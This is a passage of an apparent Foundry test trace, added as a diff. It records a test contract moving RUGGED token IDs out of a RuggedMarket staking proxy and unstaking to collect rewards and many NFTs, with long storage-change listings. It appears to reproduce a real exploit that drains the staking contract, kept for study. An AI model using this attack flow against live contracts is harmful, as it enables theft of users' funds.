+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bf6cf2e3122068a41 → 0x00000000000000000000000000000000000000000000001be8ee777d7aa28a41
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 18 → 19
+    │   │   │   │   │   │   @ 0x5e32d5a093587ea83172d78e4cf06f0f12106514810a73d0f00754720c616eba: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x6fb6557de3395141aa9888cf395b4ffde37db51885d9441c1ec68fa29c9426c1: 8 → 18
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000f9ccd8a1c5080000 → 0x00000000000000000000000000000000000000000000000107ad8f556c6c0000
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 515 → 514
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9e: 0 → 7991
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4945)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4945)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x8da61f0ba95efa75981093b7e981f31c2521cefb7e27bcc5d8d4ec9d256a89ec: 21 → 19
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e0: 5045 → 0
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 514 → 513
+    │   │   │   │   │   │   @ 0x8ade9df877cb80af548f38370331a164b97518ec72222059c8aaf19e6dec14c1: 513 → 21
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000107ad8f556c6c0000 → 0x000000000000000000000000000000000000000000000001158e460913d00000
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 0 → 4945
+    │   │   │   │   │   │   @ 0x48dd8d21eb66092b5011858cd63de145f4b1a9f5ca695c3ddfa8fa7b24091d97: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604f4: 4945 → 5045
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 19 → 20
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001be8ee777d7aa28a41 → 0x00000000000000000000000000000000000000000000001bdb0dc0c9d33e8a41
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 5: 0 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [630] RUGGED::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 20000000000000000000 [2e19]
+    │   │   ├─ [2233086] proxy::unstake(20000000000000000000 [2e19])
+    │   │   │   ├─ [2232696] RuggedMarket::unstake(20000000000000000000 [2e19]) [delegatecall]
+    │   │   │   │   ├─ [4904] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 82421081864000000 [8.242e16])
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 82421081864000000 [8.242e16])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bdb0dc0c9d33e8a41 → 0x00000000000000000000000000000000000000000000001bd9e8ef4048bcb841
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000001158e460913d00000 → 0x00000000000000000000000000000000000000000000000116b317929e51d200
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2215934] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20000000000000000000 [2e19])
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 643)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 358)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9264)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 338)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 8655)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4039)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5458)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 7637)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5676)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5717)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5367)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4810)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4574)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4011)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 2314)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5862)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 1769)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9848)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9792)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9577)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 20000000000000000000 [2e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x509055df01107bc64af72dc08330b9397ce32ea3183e634e399c3833b7aa595e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e6e: 347 → 9848
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606dc: 338 → 0
+    │   │   │   │   │   │   @ 0x5d2b15e8f5f815fb50b5b7a25cacff81404ca066c26d5e2169c5ae3b4e19e56b: 1 → 0
+    │   │   │   │   │   │   @ 0x0c4a44ce34df80952148b7b55c7e8acaf6e91b820b49391d0f0a2b34d035ba0c: 500 → 0
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da3: 0 → 9050
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da4: 0 → 3033
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c33: 41 → 2314
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3e62: 9017 → 5367
+    │   │   │   │   │   │   @ 0x1214a60f33c6391325f4fe835803e25bbbc9ab9ba21d99ebf959d2fd32d9d52e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xdc546f96e41e999be4708cb6101a04d8f998356cd939cdf7cc4d0a8fa5af457b: 0 → 1
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dac: 0 → 3525
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bd9e8ef4048bcb841 → 0x00000000000000000000000000000000000000000000001ac45aa93734ecb841
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da7: 0 → 9192
+    │   │   │   │   │   │   @ 0x43b2386d4d3972d2f65d70f347e567d6b0c366ab6fb9eb781c2f1d30d6b1d7e5: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xc3c7fb6a95b80182ab6b591f943a09f0ce415e4da4e0ecaf98679ba9df432a6d: 497 → 0
+    │   │   │   │   │   │   @ 0x86687c7176d6ec32d7764f9b1443646d5ccf88d0ed3954d868774dc2cd878cfe: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x61042a91e6bf866457bba3c0e1666b25163b3849470db2bebc37920294f5c189: 0 → 1
+    │   │   │   │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xbe2c3a487941f55e5881f06652a276fbd45a3685be1c48f42264468f7c028a36: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x201eefa0b4934df22afa051a4a9c50a1a60812f397c2287f31526961a63e7648: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x9c21bc71da0e484dfd35ad2a10d338fedd95a67f06d8e39198816abf0c9b1168: 0 → 27
+    │   │   │   │   │   │   @ 0xfbf57951a20a7af7daeefa1d2d90f0cd061fcf465fe6b720b4ff482e80709475: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x754c3d23b53fe0c86c15828a5ac606752c899fa8175b595783936f2a9b59c3df: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xfb65761e2b328a03a36b8f31e9431fb9096b55c3bf735d6531838cc6e005e1fc: 505 → 0
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daa: 0 → 7093
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da9: 0 → 9017
+    │   │   │   │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d2: 4011 → 0
+    │   │   │   │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 0 → 24
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4bce: 3913 → 338
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db2: 0 → 8796
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dab: 0 → 4090
+    │   │   │   │   │   │   @ 0x6a71dca57933fa17eee14913cde5265fb9e89923a9146e65eb6c63cec9c9a91e: 0 → 1
+    │   │   │   │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 0 → 29
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db0: 0 → 3913
+    │   │   │   │   │   │   @ 0xa44cf8214680f4e1a824e25b8c3300bef5773bde0bd01e6b84e832bf6653012c: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0xcc2c5c17b159d60d905b954901e7a94ae9978f5d8ea9527f13bcd28ff7a38b73: 0 → 35
+    │   │   │   │   │   │   @ 0x96cf7746f18a97cf11d1e4d88837e1786085500ea82c421d7cdbd15759a9d51e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 0 → 20
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da1: 0 → 8866
+    │   │   │   │   │   │   @ 0x56eff69ceea4ed7dc108bc9b4b6869a9d8c43c7c7167557b35cc5dd6e095b85d: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x2e7bf30fc8c8d5ec435867d0c613e08548fd6c252f87bd72fa806b75ef9eb9f1: 1 → 0
+    │   │   │   │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xc921984d2c33a69f8375f086d9b3a96627202e9779634ae9c1a69f69a45f58d8: 511 → 0
+    │   │   │   │   │   │   @ 0xb7cc3f2e7844e64cd1d924b873790896754a275358b786ac1ba5dc726cd4fd88: 1 → 0
+    │   │   │   │   │   │   @ 0xa29d45e22a9a0f30d38df49c200ba922d7536c11836487ef7c1358d984142409: 510 → 0
+    │   │   │   │   │   │   @ 0xbbe1eab42e196d0b085936a6eebd5fc27628079e1c2a436cce03020d394c295f: 506 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d0: 5862 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606db: 8655 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d9: 5458 → 0
+    │   │   │   │   │   │   @ 0xb9cdf88b8d8f3e02e247d6babc82904403029ae5cea1bcd019e7d104eba05f45: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x36822dd15940f1efccfbc62c0ff56967efaf9783a99f51ad14a05140cb0a430b: 0 → 1
+    │   │   │   │   │   │   @ 0x770feb3423151f21403e86d4f8cc8f50a4ad771df31647cb866e27d00502c0c1: 1 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb414d: 4984 → 4039
+    │   │   │   │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xcbe6aea63eaeb3e182c411c5b40221ff01f55667ecf57e7c7128fac6e25e2b71: 1 → 0
+    │   │   │   │   │   │   @ 0x5b053a6f0242520d4e5daa90fe6eddb38b2e7d2afe6575e476efb712b763e344: 0 → 39
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d4: 4810 → 0
+    │   │   │   │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 0 → 30
+    │   │   │   │   │   │   @ 0x3a3d7165046fe6a416c679e65f8a794a793ab4c932d5805fb6301e006ef54021: 499 → 0
+    │   │   │   │   │   │   @ 0x6954541263162baed709c02b1958d5d53bc4ca664d181f4de4544acb26f18a9c: 1 → 0
+    │   │   │   │   │   │   @ 0xed328d2bb428e8669bc7cffac36f7bfa7be91b9f3cf6909ec4029ad835946798: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da2: 0 → 347
+    │   │   │   │   │   │   @ 0x51d81e7164cbe709527ea8caa824727bc4e31084732f294382d09f739085b019: 1 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d5: 5367 → 0
+    │   │   │   │   │   │   @ 0xd9f0ab2dde70205bf43c828029343c0e47e215095e2b6694cc4c6170cf031138: 512 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb46f2: 8866 → 9792
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb43ac: 6049 → 9264
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d7: 5676 → 0
+    │   │   │   │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 0 → 22
+    │   │   │   │   │   │   @ 0x096ddad3bfdd3ba6526f0b7845c553d531ca1974fe09161b209eeb3c1cf14169: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x73df13df11fdd98e14c62b0277be82bee99cc611468e3b7ae57fafca6b691787: 1 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4215: 7449 → 8655
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4b8f: 3525 → 7637
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dae: 0 → 4984
+    │   │   │   │   │   │   @ 0xa76eb3f731976f4f5aa42c8333a8ac99dc5590fc54deaf08ec4561495bc01f83: 1 → 0
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000116b317929e51d200 → 0x0000000000000000000000000000000000000000000000022c415d9bb221d200
+    │   │   │   │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 0 → 38
+    │   │   │   │   │   │   @ 0x4af2d71d62c778d8266ef9eb560af5aa17a48df876ed565035d1482852b6d9cc: 495 → 0
+    │   │   │   │   │   │   @ 0x3e85fa78b888a9a70b16d8b2ffd5a5ce13ee49b9cf26488c0be4f968132d0c5f: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x16d4236f8135b486684a8fac3481a9cf3bb5748669ffb02a03afa726d60d00f8: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xd9379a4d2df17ecad725133e46dbfa3a48f8df77dd941acd4d8666c461a1777d: 0 → 1
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c87: 3033 → 5862
+    │   │   │   │   │   │   @ 0xdc020bd6a71f163563b7d66e645c0eeb6f4898caf381861ae2efab5dadd03e6a: 507 → 0
+    │   │   │   │   │   │   @ 0x1b137e43b0e30898156d4dbd1f04e48bffecac6b87d788f4d716dc4cedc28e45: 0 → 28
+    │   │   │   │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 0 → 31
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db1: 0 → 6049
+    │   │   │   │   │   │   @ 0x85d1cb275c2136a6bc7b677be74095b987fa5bea8e98e1dd65cdcf3ecfa7abaa: 509 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb42f2: 9192 → 4574
+    │   │   │   │   │   │   @ 0x834da7317bb7b7ccf158a7d5f3903b4af4b2510b4dd6b19986c59d415502b531: 502 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606dd: 9264 → 0
+    │   │   │   │   │   │   @ 0x05f66b790f72b03c9bbe6651b5b5cbe30b3506b439b5997494249d06fe1e63ca: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4621: 9050 → 1769
+    │   │   │   │   │   │   @ 0x7eca25646d77fbe48d97efe900eaf35453ca5066c6465950256408bb31a48a1b: 0 → 33
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4579: 3978 → 5458
+    │   │   │   │   │   │   @ 0xf2fd03ad4e254bdad2fe17ba09af9c75d08a7fa2e857461c6471ddf929e5138a: 0 → 1
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606cf: 1769 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606cd: 9792 → 0
+    │   │   │   │   │   │   @ 0x20f36b4f286910155c9a43b39d1ba3dcd6c819b066c28aafbde54a9d9b465b6b: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x4cdf35efc026208dc9e91259dc31f4454039f4347d82563fc19fc367bc4e8581: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x9e529acbe0ad88182db3ee3e75b9320ef0fd48fc218e007112027a3c3ba59a01: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x0245e145a8fb994f24b5320c70d75131ab116fc99e00b14eebbb0beb82e7b370: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0xdbdc55d7621c6061576ada6656295ae01b65e3eb3f1854f3486f5ce65e3c82d2: 0 → 36
+    │   │   │   │   │   │   @ 0xb59ab80f5598cb65e185f83739c5b8a9f7ed18c2d44c1cfa8eb3fe5e47e30e9e: 1 → 0
+    │   │   │   │   │   │   @ 0x216ec719c0213e89d814536f480598bd82ab255dd54b5ee25b87663456e1f7c5: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
